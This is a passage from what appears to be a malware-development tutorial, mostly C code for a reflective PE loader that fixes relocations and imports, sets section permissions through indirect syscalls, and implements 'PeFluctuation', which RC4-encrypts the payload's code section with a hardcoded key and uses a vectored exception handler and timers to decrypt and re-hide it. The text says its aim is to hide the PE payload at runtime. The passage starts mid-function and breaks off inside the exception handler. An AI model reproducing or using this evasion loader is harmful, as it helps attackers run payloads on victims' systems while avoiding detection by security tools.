					<span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>WORD<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>pPeBaseAddress <span class="token operator">+</span> pImgBaseRelocation<span class="token operator">-&gt;</span>VirtualAddress <span class="token operator">+</span> pBaseRelocEntry<span class="token operator">-&gt;</span>Offset<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+=</span> <span class="token function">LOWORD</span><span class="token punctuation">(</span>uDeltaOffset<span class="token punctuation">)</span><span class="token punctuation">;</span>
					<span class="token keyword">break</span><span class="token punctuation">;</span>
				<span class="token punctuation">}</span>
				<span class="token keyword">case</span> IMAGE_REL_BASED_ABSOLUTE<span class="token operator">:</span> <span class="token punctuation">{</span>
					<span class="token comment">// No relocation is required.</span>
					<span class="token keyword">break</span><span class="token punctuation">;</span>
				<span class="token punctuation">}</span>
				<span class="token keyword">default</span><span class="token operator">:</span> <span class="token punctuation">{</span>
					<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
				<span class="token punctuation">}</span>
			
			<span class="token punctuation">}</span>

			pBaseRelocEntry<span class="token operator">++</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>

		pImgBaseRelocation <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_BASE_RELOCATION<span class="token punctuation">)</span>pBaseRelocEntry<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">return</span> TRUE<span class="token punctuation">;</span>
<span class="token punctuation">}</span>


BOOL <span class="token function">FixImportAddressTable</span><span class="token punctuation">(</span>IN PIMAGE_DATA_DIRECTORY pEntryImportDataDir<span class="token punctuation">,</span> IN PBYTE pPeBaseAddress<span class="token punctuation">)</span> <span class="token punctuation">{</span>

	<span class="token comment">// Pointer to an import descriptor for a DLL</span>
	PIMAGE_IMPORT_DESCRIPTOR	pImgDescriptor <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	<span class="token comment">// Iterate over the import descriptors</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span>SIZE_T i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> pEntryImportDataDir<span class="token operator">-&gt;</span>Size<span class="token punctuation">;</span> i <span class="token operator">+=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>IMAGE_IMPORT_DESCRIPTOR<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token comment">// Get the current import descriptor</span>
		pImgDescriptor <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_IMPORT_DESCRIPTOR<span class="token punctuation">)</span><span class="token punctuation">(</span>pPeBaseAddress <span class="token operator">+</span> pEntryImportDataDir<span class="token operator">-&gt;</span>VirtualAddress <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token comment">// If both thunks are NULL, we've reached the end of the import descriptors list</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span>pImgDescriptor<span class="token operator">-&gt;</span>OriginalFirstThunk <span class="token operator">==</span> <span class="token constant">NULL</span> <span class="token operator">&amp;&amp;</span> pImgDescriptor<span class="token operator">-&gt;</span>FirstThunk <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
			<span class="token keyword">break</span><span class="token punctuation">;</span>

		<span class="token comment">// Retrieve information from the current import descriptor</span>
		LPSTR		cDllName                 <span class="token operator">=</span> <span class="token punctuation">(</span>LPSTR<span class="token punctuation">)</span><span class="token punctuation">(</span>pPeBaseAddress <span class="token operator">+</span> pImgDescriptor<span class="token operator">-&gt;</span>Name<span class="token punctuation">)</span><span class="token punctuation">;</span>
		ULONG_PTR	uOriginalFirstThunkRVA   <span class="token operator">=</span> pImgDescriptor<span class="token operator">-&gt;</span>OriginalFirstThunk<span class="token punctuation">;</span>
		ULONG_PTR	uFirstThunkRVA           <span class="token operator">=</span> pImgDescriptor<span class="token operator">-&gt;</span>FirstThunk<span class="token punctuation">;</span>
		SIZE_T		ImgThunkSize             <span class="token operator">=</span> <span class="token number">0x00</span><span class="token punctuation">;</span>					<span class="token comment">// Used to move to the next function (iterating through the IAT and INT)</span>
		HMODULE		hModule                  <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>


		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>hModule <span class="token operator">=</span> g_WinAPI<span class="token punctuation">.</span><span class="token function">pLoadLibraryA</span><span class="token punctuation">(</span>cDllName<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
			<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>

		<span class="token comment">// Iterate over the imported functions for the current DLL</span>
		<span class="token keyword">while</span> <span class="token punctuation">(</span>TRUE<span class="token punctuation">)</span> <span class="token punctuation">{</span>

			<span class="token comment">// Get pointers to the first thunk and original first thunk data</span>
			PIMAGE_THUNK_DATA               pOriginalFirstThunk     <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_THUNK_DATA<span class="token punctuation">)</span><span class="token punctuation">(</span>pPeBaseAddress <span class="token operator">+</span> uOriginalFirstThunkRVA <span class="token operator">+</span> ImgThunkSize<span class="token punctuation">)</span><span class="token punctuation">;</span>
			PIMAGE_THUNK_DATA               pFirstThunk             <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_THUNK_DATA<span class="token punctuation">)</span><span class="token punctuation">(</span>pPeBaseAddress <span class="token operator">+</span> uFirstThunkRVA <span class="token operator">+</span> ImgThunkSize<span class="token punctuation">)</span><span class="token punctuation">;</span>
			PIMAGE_IMPORT_BY_NAME           pImgImportByName        <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
			ULONG_PTR                       pFuncAddress            <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>

			<span class="token comment">// At this point both 'pOriginalFirstThunk' &amp; 'pFirstThunk' will have the same values</span>
			<span class="token comment">// However, to populate the IAT (pFirstThunk), one should use the INT (pOriginalFirstThunk) to retrieve the </span>
			<span class="token comment">// functions addresses and patch the IAT (pFirstThunk-&gt;u1.Function) with the calculated address.</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span>pOriginalFirstThunk<span class="token operator">-&gt;</span>u1<span class="token punctuation">.</span>Function <span class="token operator">==</span> <span class="token constant">NULL</span> <span class="token operator">&amp;&amp;</span> pFirstThunk<span class="token operator">-&gt;</span>u1<span class="token punctuation">.</span>Function <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
				<span class="token keyword">break</span><span class="token punctuation">;</span>
			<span class="token punctuation">}</span>


			<span class="token comment">// If the ordinal flag is set, import the function by its ordinal number</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">IMAGE_SNAP_BY_ORDINAL</span><span class="token punctuation">(</span>pOriginalFirstThunk<span class="token operator">-&gt;</span>u1<span class="token punctuation">.</span>Ordinal<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
				<span class="token comment">// Since our GetProcAddressH function doesn't support ordinals as input, one can fetch the function address via the following code:</span>

				<span class="token comment">// Retrieve required headers of the loaded DLL module</span>
				PIMAGE_NT_HEADERS               _pImgNtHdrs                 <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
				PIMAGE_EXPORT_DIRECTORY         _pImgExportDir              <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
				PDWORD                          _pdwFunctionAddressArray    <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>

				_pImgNtHdrs <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>ULONG_PTR<span class="token punctuation">)</span>hModule <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>PIMAGE_DOS_HEADER<span class="token punctuation">)</span>hModule<span class="token punctuation">)</span><span class="token operator">-&gt;</span>e_lfanew<span class="token punctuation">)</span><span class="token punctuation">;</span>
				<span class="token keyword">if</span> <span class="token punctuation">(</span>_pImgNtHdrs<span class="token operator">-&gt;</span>Signature <span class="token operator">!=</span> IMAGE_NT_SIGNATURE<span class="token punctuation">)</span>
					<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>

				_pImgExportDir			<span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_EXPORT_DIRECTORY<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>ULONG_PTR<span class="token punctuation">)</span>hModule<span class="token punctuation">)</span> <span class="token operator">+</span> _pImgNtHdrs<span class="token operator">-&gt;</span>OptionalHeader<span class="token punctuation">.</span>DataDirectory<span class="token punctuation">[</span>IMAGE_DIRECTORY_ENTRY_EXPORT<span class="token punctuation">]</span><span class="token punctuation">.</span>VirtualAddress<span class="token punctuation">)</span><span class="token punctuation">;</span>
				_pdwFunctionAddressArray	<span class="token operator">=</span> <span class="token punctuation">(</span>PDWORD<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>ULONG_PTR<span class="token punctuation">)</span>hModule <span class="token operator">+</span> _pImgExportDir<span class="token operator">-&gt;</span>AddressOfFunctions<span class="token punctuation">)</span><span class="token punctuation">;</span>
				<span class="token comment">// Use the ordinal to retrieve the function address</span>
				pFuncAddress			<span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>ULONG_PTR<span class="token punctuation">)</span>hModule <span class="token operator">+</span> _pdwFunctionAddressArray<span class="token punctuation">[</span>pOriginalFirstThunk<span class="token operator">-&gt;</span>u1<span class="token punctuation">.</span>Ordinal<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

				<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>pFuncAddress<span class="token punctuation">)</span> <span class="token punctuation">{</span>
					<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
				<span class="token punctuation">}</span>

			<span class="token punctuation">}</span>
			<span class="token comment">// Import function by name</span>
			<span class="token keyword">else</span> <span class="token punctuation">{</span>
				pImgImportByName <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_IMPORT_BY_NAME<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>SIZE_T<span class="token punctuation">)</span>pPeBaseAddress <span class="token operator">+</span> pOriginalFirstThunk<span class="token operator">-&gt;</span>u1<span class="token punctuation">.</span>AddressOfData<span class="token punctuation">)</span><span class="token punctuation">;</span>
				<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>pFuncAddress <span class="token operator">=</span> <span class="token punctuation">(</span>ULONG_PTR<span class="token punctuation">)</span><span class="token function">GetProcAddressH</span><span class="token punctuation">(</span>hModule<span class="token punctuation">,</span> <span class="token function">HASH</span><span class="token punctuation">(</span>pImgImportByName<span class="token operator">-&gt;</span>Name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
					<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
				<span class="token punctuation">}</span>
			<span class="token punctuation">}</span>

			<span class="token comment">// Install the function address in the IAT</span>
			pFirstThunk<span class="token operator">-&gt;</span>u1<span class="token punctuation">.</span>Function <span class="token operator">=</span> <span class="token punctuation">(</span>ULONGLONG<span class="token punctuation">)</span>pFuncAddress<span class="token punctuation">;</span>

			<span class="token comment">// Move to the next function in the IAT/INT array</span>
			ImgThunkSize <span class="token operator">+=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>IMAGE_THUNK_DATA<span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token punctuation">}</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">return</span> TRUE<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">/* Global Variables */</span>
ULONG_PTR			g_uPeTextAddress		<span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
SIZE_T				g_sPeTextSize			<span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>


BOOL <span class="token function">FixMemPermissions</span><span class="token punctuation">(</span>IN ULONG_PTR pPeBaseAddress<span class="token punctuation">,</span> IN PIMAGE_NT_HEADERS pImgNtHdrs<span class="token punctuation">,</span> IN PIMAGE_SECTION_HEADER pImgSecHdr<span class="token punctuation">)</span> <span class="token punctuation">{</span>

	<span class="token comment">// Loop through each section of the PE image.</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span>DWORD i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> pImgNtHdrs<span class="token operator">-&gt;</span>FileHeader<span class="token punctuation">.</span>NumberOfSections<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

		NTSTATUS	STATUS			<span class="token operator">=</span> <span class="token number">0x00</span><span class="token punctuation">;</span>
		DWORD		dwProtection	<span class="token operator">=</span> <span class="token number">0x00</span><span class="token punctuation">,</span>
				    dwOldProtection	<span class="token operator">=</span> <span class="token number">0x00</span><span class="token punctuation">;</span>
		PVOID		pAddress		<span class="token operator">=</span> <span class="token punctuation">(</span>PVOID<span class="token punctuation">)</span><span class="token punctuation">(</span>pPeBaseAddress <span class="token operator">+</span> pImgSecHdr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>VirtualAddress<span class="token punctuation">)</span><span class="token punctuation">;</span>
		SIZE_T		sSize			<span class="token operator">=</span> <span class="token punctuation">(</span>SIZE_T<span class="token punctuation">)</span>pImgSecHdr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>SizeOfRawData<span class="token punctuation">;</span>

		<span class="token comment">// Skip the section if it has no data or no associated virtual address.</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>pImgSecHdr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>SizeOfRawData <span class="token operator">||</span> <span class="token operator">!</span>pImgSecHdr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>VirtualAddress<span class="token punctuation">)</span>
			<span class="token keyword">continue</span><span class="token punctuation">;</span>

		<span class="token keyword">if</span> <span class="token punctuation">(</span>pImgSecHdr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>Characteristics <span class="token operator">&amp;</span> IMAGE_SCN_MEM_WRITE<span class="token punctuation">)</span>
			dwProtection <span class="token operator">=</span> PAGE_WRITECOPY<span class="token punctuation">;</span>

		<span class="token keyword">if</span> <span class="token punctuation">(</span>pImgSecHdr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>Characteristics <span class="token operator">&amp;</span> IMAGE_SCN_MEM_READ<span class="token punctuation">)</span>
			dwProtection <span class="token operator">=</span> PAGE_READONLY<span class="token punctuation">;</span>

		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>pImgSecHdr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>Characteristics <span class="token operator">&amp;</span> IMAGE_SCN_MEM_WRITE<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>pImgSecHdr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>Characteristics <span class="token operator">&amp;</span> IMAGE_SCN_MEM_READ<span class="token punctuation">)</span><span class="token punctuation">)</span>
			dwProtection <span class="token operator">=</span> PAGE_READWRITE<span class="token punctuation">;</span>

		<span class="token keyword">if</span> <span class="token punctuation">(</span>pImgSecHdr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>Characteristics <span class="token operator">&amp;</span> IMAGE_SCN_MEM_EXECUTE<span class="token punctuation">)</span>
			dwProtection <span class="token operator">=</span> PAGE_EXECUTE<span class="token punctuation">;</span>

		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>pImgSecHdr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>Characteristics <span class="token operator">&amp;</span> IMAGE_SCN_MEM_EXECUTE<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>pImgSecHdr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>Characteristics <span class="token operator">&amp;</span> IMAGE_SCN_MEM_WRITE<span class="token punctuation">)</span><span class="token punctuation">)</span>
			dwProtection <span class="token operator">=</span> PAGE_EXECUTE_WRITECOPY<span class="token punctuation">;</span>

		<span class="token comment">// If memory should be RX, we save its base address and size</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>pImgSecHdr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>Characteristics <span class="token operator">&amp;</span> IMAGE_SCN_MEM_EXECUTE<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>pImgSecHdr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>Characteristics <span class="token operator">&amp;</span> IMAGE_SCN_MEM_READ<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
			<span class="token comment">// Save RX base address</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>g_uPeTextAddress<span class="token punctuation">)</span>
				g_uPeTextAddress <span class="token operator">=</span> pPeBaseAddress <span class="token operator">+</span> pImgSecHdr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>VirtualAddress<span class="token punctuation">;</span>

			<span class="token comment">// Save the RX memory size</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>g_sPeTextSize<span class="token punctuation">)</span>
				g_sPeTextSize <span class="token operator">=</span> pImgSecHdr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>SizeOfRawData<span class="token punctuation">;</span>

			dwProtection <span class="token operator">=</span> PAGE_EXECUTE_READ<span class="token punctuation">;</span>
		<span class="token punctuation">}</span>

		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>pImgSecHdr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>Characteristics <span class="token operator">&amp;</span> IMAGE_SCN_MEM_EXECUTE<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>pImgSecHdr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>Characteristics <span class="token operator">&amp;</span> IMAGE_SCN_MEM_WRITE<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>pImgSecHdr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>Characteristics <span class="token operator">&amp;</span> IMAGE_SCN_MEM_READ<span class="token punctuation">)</span><span class="token punctuation">)</span>
			dwProtection <span class="token operator">=</span> PAGE_EXECUTE_READWRITE<span class="token punctuation">;</span>

		<span class="token comment">// Apply the determined memory protection to the section.</span>
		<span class="token function">SET_SYSCALL</span><span class="token punctuation">(</span>g_Nt<span class="token punctuation">.</span>NtProtectVirtualMemory<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">NT_SUCCESS</span><span class="token punctuation">(</span>STATUS <span class="token operator">=</span> <span class="token function">RunSyscall</span><span class="token punctuation">(</span><span class="token function">NtCurrentProcess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>pAddress<span class="token punctuation">,</span> <span class="token operator">&amp;</span>sSize<span class="token punctuation">,</span> dwProtection<span class="token punctuation">,</span> <span class="token operator">&amp;</span>dwOldProtection<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
			<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">return</span> TRUE<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<p>Since this implementation requires PeFluctuation, the <code>FixMemPermissions</code> function must keep track of the <code>PAGE_EXECUTE_READ</code> memory region, which is the <code>.text</code> section of the PE payload. This is done by initializing the <code>g_uPeTextAddress</code> and <code>g_sPeTextSize</code> global variables which are the executable memory's base address and size respectively. The <code>FixMemPermissions</code> function was updated to perform this action in the <em>PeFluctuation</em> module, review that module if necessary.</p>
<h3 id="toc-heading-11">PEFluctuation Implementation</h3>
<p>As shown in the previous module, PeFluctuation's purpose is to hide 
the PE payload at runtime. A brief overview of the implementation steps 
is shown below, however, if you need a complete overview of the steps 
revisit the previous module.</p>
<ul>
<li>
<p>After <code>CreateTimerQueueTimer</code>'s timer expires, it executes <code>Rc4EncryptDecrypt</code>;
 a function that will encrypt the executable memory region of the PE 
payload, and mark it as read-only. This step occurs prior to executing 
the payload's entry point.</p>
</li>
<li>
<p>Upon code execution attempts made by the payload, an <code>EXCEPTION_ACCESS_VIOLATION</code> exception will be raised, which is handled by a VEH function named <code>PeFluctuationVectoredExceptionHandler</code>. This function will decrypt the encrypted .text section and mark it as executable memory, allowing the payload to run its code.</p>
</li>
<li>
<p>From within <code>PeFluctuationVectoredExceptionHandler</code>, the <code>Rc4EncryptDecrypt</code> function will be called again using <code>CreateTimerQueueTimer</code> to re-conceal the PE payload in memory.</p>
</li>
</ul>
<h4 id="toc-heading-12">Rc4EncryptDecrypt</h4>
<p>The <code>Rc4EncryptDecrypt</code> function accepts the following parameters:</p>
<ul>
<li>
<p><code>pBuffer</code> - Base address of the memory to encrypt/decrypt.</p>
</li>
<li>
<p><code>dwBufferLen</code> - Size of the memory region to encrypt/decrypt starting from <code>pBuffer</code>.</p>
</li>
<li>
<p><code>bDecrypt</code> - If this parameter is <code>TRUE</code>, it sets the memory permission to <code>PAGE_EXECUTE_READ</code> after decrypting. Whereas if it's <code>FALSE</code>, it sets the memory permission to <code>PAGE_READONLY</code> after encrypting.</p>
</li>
</ul>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span>		<span class="token macro-name">RC4_KEY_SIZE</span>				<span class="token expression"><span class="token number">0x10</span>	</span><span class="token comment">// 16 byte</span></span>


BYTE	g_Rc4Key<span class="token punctuation">[</span>RC4_KEY_SIZE<span class="token punctuation">]</span>	<span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token number">0xDD</span><span class="token punctuation">,</span> <span class="token number">0x79</span><span class="token punctuation">,</span> <span class="token number">0x7F</span><span class="token punctuation">,</span> <span class="token number">0x03</span><span class="token punctuation">,</span> <span class="token number">0xA5</span><span class="token punctuation">,</span> <span class="token number">0x87</span><span class="token punctuation">,</span> <span class="token number">0xEF</span><span class="token punctuation">,</span> <span class="token number">0x71</span><span class="token punctuation">,</span> <span class="token number">0x4D</span><span class="token punctuation">,</span> <span class="token number">0xDB</span><span class="token punctuation">,</span> <span class="token number">0x7D</span><span class="token punctuation">,</span> <span class="token number">0xF4</span><span class="token punctuation">,</span> <span class="token number">0x47</span><span class="token punctuation">,</span> <span class="token number">0x77</span><span class="token punctuation">,</span> <span class="token number">0x01</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>

BOOL <span class="token function">Rc4EncryptDecrypt</span><span class="token punctuation">(</span>IN PBYTE pBuffer<span class="token punctuation">,</span> IN DWORD dwBufferLen<span class="token punctuation">,</span> IN BOOL bDecrypt<span class="token punctuation">)</span> <span class="token punctuation">{</span>

	NTSTATUS				STATUS					<span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	USTRING					uStrBuffer				<span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token punctuation">.</span>Buffer <span class="token operator">=</span> pBuffer<span class="token punctuation">,</span>  <span class="token punctuation">.</span>Length <span class="token operator">=</span> dwBufferLen<span class="token punctuation">,</span>  <span class="token punctuation">.</span>MaximumLength <span class="token operator">=</span> dwBufferLen <span class="token punctuation">}</span><span class="token punctuation">;</span>
	USTRING					uStrKey					<span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token punctuation">.</span>Buffer <span class="token operator">=</span> g_Rc4Key<span class="token punctuation">,</span> <span class="token punctuation">.</span>Length <span class="token operator">=</span> RC4_KEY_SIZE<span class="token punctuation">,</span> <span class="token punctuation">.</span>MaximumLength <span class="token operator">=</span> RC4_KEY_SIZE <span class="token punctuation">}</span><span class="token punctuation">;</span>
	DWORD					dwOldProtection			<span class="token operator">=</span> <span class="token number">0x00</span><span class="token punctuation">;</span>
	PVOID					pTmpBuffer				<span class="token operator">=</span> <span class="token punctuation">(</span>PVOID<span class="token punctuation">)</span>pBuffer<span class="token punctuation">;</span>
	SIZE_T					sTmpBufferLen			<span class="token operator">=</span> <span class="token punctuation">(</span>SIZE_T<span class="token punctuation">)</span>dwBufferLen<span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>pTmpBuffer <span class="token operator">||</span> <span class="token operator">!</span>sTmpBufferLen<span class="token punctuation">)</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>

	<span class="token comment">// Change the target's memory permissions to RW to allow encrypting (it was RO)</span>
	<span class="token function">SET_SYSCALL</span><span class="token punctuation">(</span>g_Nt<span class="token punctuation">.</span>NtProtectVirtualMemory<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">NT_SUCCESS</span><span class="token punctuation">(</span>STATUS <span class="token operator">=</span> <span class="token function">RunSyscall</span><span class="token punctuation">(</span><span class="token function">NtCurrentProcess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>pTmpBuffer<span class="token punctuation">,</span> <span class="token operator">&amp;</span>sTmpBufferLen<span class="token punctuation">,</span> PAGE_READWRITE<span class="token punctuation">,</span> <span class="token operator">&amp;</span>dwOldProtection<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	
	<span class="token comment">// Encrypt/Decrypt input data</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">NT_SUCCESS</span><span class="token punctuation">(</span><span class="token punctuation">(</span>STATUS <span class="token operator">=</span> g_WinAPI<span class="token punctuation">.</span><span class="token function">pSystemFunction032</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>uStrBuffer<span class="token punctuation">,</span> <span class="token operator">&amp;</span>uStrKey<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0x0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	
	<span class="token comment">// Change the memory permissions to RO/RX.</span>
	<span class="token function">SET_SYSCALL</span><span class="token punctuation">(</span>g_Nt<span class="token punctuation">.</span>NtProtectVirtualMemory<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">NT_SUCCESS</span><span class="token punctuation">(</span>STATUS <span class="token operator">=</span> <span class="token function">RunSyscall</span><span class="token punctuation">(</span><span class="token function">NtCurrentProcess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>pTmpBuffer<span class="token punctuation">,</span> <span class="token operator">&amp;</span>sTmpBufferLen<span class="token punctuation">,</span> <span class="token punctuation">(</span>bDecrypt <span class="token operator">==</span> TRUE <span class="token operator">?</span> PAGE_EXECUTE_READ <span class="token operator">:</span> PAGE_READONLY<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>dwOldProtection<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	
	<span class="token keyword">return</span> TRUE<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<h4 id="toc-heading-13">PeFluctuationVectoredExceptionHandler</h4>
<p>Our VEH function that will handle exceptions is shown below.</p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c">LONG WINAPI <span class="token function">PeFluctuationVectoredExceptionHandler</span><span class="token punctuation">(</span>PEXCEPTION_POINTERS pExceptionInfo<span class="token punctuation">)</span> 
<span class="token punctuation">{</span>
	<span class="token comment">// Check the exception code</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>pExceptionInfo<span class="token operator">-&gt;</span>ExceptionRecord<span class="token operator">-&gt;</span>ExceptionCode <span class="token operator">==</span> EXCEPTION_ACCESS_VIOLATION<span class="token punctuation">)</span> <span class="token punctuation">{</span>

